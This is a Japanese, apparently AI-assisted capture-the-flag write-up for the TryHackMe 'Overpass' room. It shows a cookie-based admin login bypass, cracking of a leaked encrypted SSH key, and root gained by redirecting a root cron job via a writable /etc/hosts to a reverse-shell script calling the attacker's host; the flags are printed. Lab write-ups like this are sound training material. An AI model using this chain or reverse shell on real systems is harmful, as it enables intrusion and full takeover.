# TryHackMe — Overpass

> AI-assisted writeup (Japanese). Room: https://tryhackme.com/room/overpass

---

```bash
┌──(kali㉿kali-1-kalija)-[~]
└─$ nmap 10.49.131.245                                             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 11:50 +0900
Nmap scan report for 10.49.131.245
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.96 seconds
```
httpにアクセスしてみる
![Overpass homepage](images/01-homepage.png)
パスワードマネージャーを配っている
About Usを見てみる
![About Us page with usernames](images/02-about-us.png)
`Ninja`,`Pars`,`Szymex`,`Bee`,`MuirlandOracle`の5つがusernameの候補

つづいて`/downloads`のページを見る
![Downloads page](images/03-downloads.png)
いったん全部DLする

---
迷子になって次の日になった

feroxの結果に`/admin`があったのでアクセスしたところ
![Admin login page](images/04-admin-login.png)
ログイン画面に到達した

答えを見たところクッキーをいじるらしかった
ただ再現性に疑問を感じたためAIに質問をした

---
ログインフォームに出会ったときのチェック項目とその優先度について

優先度　高
デフォルト認証情報の試行（admin:admin, guest:guestなど）
HTMLソースの確認（コメント、隠しフィールド、参照ファイル一覧）
参照されているJSファイルを読む（特にauth/login/session系の命名）
ログインリクエスト/レスポンスの観察（Burp, DevToolsNetwork）。ステータス、Set-Cookie

優先度　中
SQLi、NoSQLi、認証バイパスペイロード
`/api/login`などのエンドポイントを直接叩く
エラーメッセージによるユーザー名列挙

優先度　低
パスワードリセット機能の解析
総当たり

---
ということなので勇気を出してF12する


```html
|   |
|---|
|<!DOCTYPE html>|
|<html>|
||
|<head>|
|<meta charset="utf-8">|
|<meta http-equiv="X-UA-Compatible" content="IE=edge">|
|<title>Overpass</title>|
|<meta name="viewport" content="width=device-width, initial-scale=1">|
|<link rel="stylesheet" type="text/css" media="screen" href="[/css/main.css](http://10.49.140.13/css/main.css)">|
|<link rel="stylesheet" type="text/css" media="screen" href="[/css/login.css](http://10.49.140.13/css/login.css)">|
|<link rel="icon" type="image/png" href="[/img/overpass.png](http://10.49.140.13/img/overpass.png)" />|
|<script src="[/main.js](http://10.49.140.13/main.js)"></script>|
|<script src="[/login.js](http://10.49.140.13/login.js)"></script>|
|<script src="[/cookie.js](http://10.49.140.13/cookie.js)"></script>|
|</head>|
||
|<body onload="onLoad()">|
|<nav>|
|<img class="logo" src="[/img/overpass.svg](http://10.49.140.13/img/overpass.svg)" alt="Overpass logo">|
|<h2 class="navTitle"><a href="[/](http://10.49.140.13/)">Overpass</a></h2>|
|<a class="current" href="[/aboutus](http://10.49.140.13/aboutus)">About Us</a>|
|<a href="[/downloads](http://10.49.140.13/downloads)">Downloads</a>|
|</nav>|
|<div class="content">|
|<h1>Administrator area</h1>|
|<p>Please log in to access this content</p>|
|<div>|
|<h3 class="formTitle">Overpass administrator login</h1>|
|</div>|
|<form id="loginForm">|
|<div class="formElem"><label for="username">Username:</label><input id="username" name="username" required></div>|
|<div class="formElem"><label for="password">Password:</label><input id="password" name="password"|
|type="password" required></div>|
|<button>Login</button>|
|</form>|
|<div id="loginStatus"></div>|
|</div>|
|</body>|
||
|</html>|
```
`login.js`があるので読む
きっとログインまわりの動き方が分析できるはず

```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

後半の`async function login()`で
`const statusOrCookie = await response.text()`としている
この`response.text()`というのはfetchして返ってくる本文（body）である

`const responce = await postData("/api/login", creds)`とあることから
`creds`つまり`const creds = { username: usernameBox.value, password: passwordBox.value }`を
`/api/login`に投げていることがわかる

なのでそれをcurlでやろうとすると
`curl -i -X POST http://10.49.140.13/api/login -H "Content-Type: application/json" -d '{"username":"test","password":"wrong"}'`
を投げればよい
`-i`はレスポンスヘッダと本文をどちらも表示させるオプション
`-I`とすればヘッダのみとなる
`-X POST`でメソッド指定をしている。

`-H`は送るデータの形式を指定している。これはとっても重要。curlはデフォルトでは`application/x-www-form-urlencoded`を指定する。
その場合には`curl -i -X POST http://example.com/api/login -d 'username=admin&password=wrong'`とすればよい
けど毎回この形式が通るとは限らないから今回はJSON形式を指定して`-d`でJSONデータを入れている

そして投げると以下が返ってきた
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ curl -i -X POST http://10.49.140.13/api/login \
  -H "Content-Type: application/json" \     
  -d '{"username":"james","password":"wrong"}'
HTTP/1.1 400 Bad Request
Date: Fri, 29 May 2026 00:52:38 GMT
Content-Length: 21
Content-Type: text/plain; charset=utf-8

Incorrect credentials  
```
この`Incorrect credentials`が本文であり`login.js`の中で`const statusOrCookie = await response.text()`に格納される文字列だ
そしてそれが`if (statusOrCookie === "Incorrect credentials")`という条件分岐で使われる
この文字列完全一致でなければ成功という、謎に否定の条件をとっている
ここに違和感を感じれるとよいらしい

elseの部分を見てみる。つまり失敗じゃなかった場合の動きだ。
まず1行目は`Cookies.set("SessionToken",statusOrCookie)`でこれはクッキーをセットしている
２行目は`window.location = "/admin"`でこれは`/admin`に移動している

ここで要る知識が「同じURLでもクッキーの有無などによって表示されるページが違う」だ
上記のIF文をみるとこの2行だけで「成功」という扱いとしており、逆に言うとこれだけで成功ページにアクセスできるとも取れる

という論理から「じゃあ、クッキー用意すればログイン試行いらないんじゃね」と考えつくのが今回のスマートな解法である。


実際にその手順を考える
```bash
else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```
ここで考えることが「`SessionToken`という名前ならその中身を見ずに格納してないか？」ということである

まずはログインページにてF12をする
![Browser DevTools cookies panel (empty)](images/05-cookies-empty.png)

Application -> Storage -> Cookies と巡ってこのページのクッキー情報が確認できる
現在はなにも登録されていない
名前の部分をダブルクリックしてクッキーを新規作成してみる
![Creating a test cookie named aaaa](images/06-cookie-aaaa.png)
aaaaという名前のクッキーを作った
この状態でF5をしても特に変化はない

![Creating SessionToken cookie](images/07-cookie-sessiontoken-created.png)
つづいてSessionTokenという名前のクッキーを作った
![Admin panel after SessionToken cookie bypass](images/08-admin-panel.png)
この状態でF5をすると見事新しい画面を表示することに成功した
URLは依然として`/admin`であり、クッキー情報によって異なる画面が表示されることが確認できた

`james`というユーザー名とそのSSH鍵がある
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ cat james.key                                  
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
                                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ 
```
`james.key`という名前で保存し
`chmod 400 james.key`をして所有ユーザーだけが読み取りできるようにする
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ ll
合計 13216
-rw-rw-r-- 1 kali kali    2461  5月 29 09:05 james.hash
-r-------- 1 kali kali    1766  5月 29 09:03 james.key
-rw-rw-r-- 1 kali kali    5094  5月 28 13:11 overpass.go
-rw-rw-r-- 1 kali kali 2708791  5月 28 13:11 overpassFreeBSD
-rwxrwxr-x 1 kali kali 2722020  5月 28 13:11 overpassLinux
-rw-rw-r-- 1 kali kali 2692664  5月 28 13:11 overpassMacOS
-rw-rw-r-- 1 kali kali 2704465  5月 28 13:22 overpassOpenBSD
-rw-rw-r-- 1 kali kali 2674688  5月 28 13:11 overpassWindows.exe
-rw-rw-r-- 1 kali kali      37  5月 28 13:06 username.txt
                                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ 

```

これを使ってsshログインしようとしたところパスフレーズを求められた
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ ssh -i james.key james@10.49.180.59
The authenticity of host '10.49.180.59 (10.49.180.59)' can't be established.
ED25519 key fingerprint is: SHA256:Os+cANqWVUosu3PfRjyDv7+O98oSqn0+sWc3owXPDmA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.180.59' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'james.key': 
```
まずこの時点では秘密鍵は向こうにまだ送られていない
認証鍵はまだ暗号化されたままなので手元で復号してからサーバに送るのがSSH鍵認証だ
なのでその復号のためにパスフレーズがいる

パスフレーズだけでは秘密鍵を暗号化することができない
暗号化するには１２８ビットの鍵が必要だ
そこで、パスフレーズとソルト合体させたものををmd5して128ビットにする
このソルトは`james.key`に記載されている
そしてできあがった１２８ビットの鍵で暗号化したものが`james.key`である

なのでパスフレーズが分かれば同様の手順を踏んで１２８ビットの鍵が作成でき
暗号化されている秘密鍵を復号化できるというわけ


そこで`ssh2john`を使う
SSH秘密鍵を`john`で解析できる形にする
`james.key`にはSSH秘密鍵がbase64で格納されており
`ssh2john`で仮に`james.hash`が作成されたとした場合、そこにはSSH秘密鍵が16進数で格納されている。ソルトも格納されている。johnで使える形式に変換して格納されている

あとはそれをrockyouなど使ってクラックすればよい
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt james.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (james.key)     
1g 0:00:00:00 DONE (2026-05-29 11:53) 20.00g/s 267520p/s 267520c/s 267520C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ 

```
`james13`が得られた！

これで再度sshログインする
```bash
james@ip-10-49-180-59:~$ whoami
james
james@ip-10-49-180-59:~$ 
```
せいこう！
```bash
james@ip-10-49-180-59:~$ ls
todo.txt  user.txt
james@ip-10-49-180-59:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
james@ip-10-49-180-59:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@ip-10-49-180-59:~$ 
```
2つのファイルを発見した
これはtodoリストであり、muirland君曰く、パスワードマネージャーの暗号化が強くないとのことであった
jamesがパスワードを忘れないようにどこかに置くと言っている
Paradox（人名？）にどうやってパスワードマネージャーをビルドするか聞くらしい

権限昇格を探す

`sudo -l`はsudoパスがないので無理
SUIDもめぼしいものはなかった
つぎに探すのはcronタスク（Cronジョブ）
```bash
james@ip-10-49-128-6:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@ip-10-49-128-6:~$ 
```

`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`が明らかに人工物
`*`は毎ターンを表している（毎時、毎分、毎月など）
1分ごとに動かしているタスクであるということがわかる

curlで取ってきている`buildscript.sh`はtargetサイトからもダウンロードできたやつと同一のものと推測
ただ`overpass.thm`は見覚えがない
名前解決の様子を見に行く
```bash
james@ip-10-49-128-6:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@ip-10-49-128-6:~$ 
```
普通にローカルホストだった

これ、書き換えられないかな
```bash
james@ip-10-49-128-6:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
james@ip-10-49-128-6:~$ 
```
otherでもwriteできることが分かった
自分のtun0に書き換えて、python3でhttpサーバー建ててリバースシェルいれておくが正解？

ということでやってみる

まず`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`を参考に場所を作る
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ mkdir www              
                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ mkdir www/downloads    
                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ mkdir www/downloads/src
                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ tree                
.
├── james.hash
├── james.key
├── overpass.go
├── overpassFreeBSD
├── overpassLinux
├── overpassMacOS
├── overpassOpenBSD
├── overpassWindows.exe
├── username.txt
└── www
    └── downloads
        └── src

4 directories, 9 files
                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ 

```
偽`buildscript.sh`を作った
```bash
┌──(kali㉿kali-1-kalija)-[~/…/overPass/www/downloads/src]
└─$ cat buildscript.sh  
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/1234 0>&1
                                                                              
┌──(kali㉿kali-1-kalija)-[~/…/overPass/www/downloads/src]
└─$ 
```

そして`/www`でpythonサーバーを立てる
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass/www]
└─$ pwd               
/home/kali/tryhackme/overPass/www
                                                                              
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass/www]
└─$ sudo python3 -m http.server 80             
[sudo] kali のパスワード:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

そして別ターミナルでリッスンしておく
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ nc -lvnp 1234             
listening on [any] 1234 ...

```

そしてssh先で`/etc/hosts`を書き換える
```bash
james@ip-10-49-128-6:~$ vim  /etc/hosts
james@ip-10-49-128-6:~$ cat  /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.10.14.5 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@ip-10-49-128-6:~$ 
```
こうすると上記をwriteupに書き込んでいる間にリッスンポートにrootのbashが来た
```bash
┌──(kali㉿kali-1-kalija)-[~/tryhackme/overPass]
└─$ nc -lvnp 1234             
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.49.128.6] 35416
bash: cannot set terminal process group (7849): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-49-128-6:~# whoami
whoami
root
root@ip-10-49-128-6:~# pwd
pwd
/root
root@ip-10-49-128-6:~# ls
ls
buildStatus
builds
go
root.txt
src
root@ip-10-49-128-6:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@ip-10-49-128-6:~# 

```


おわり
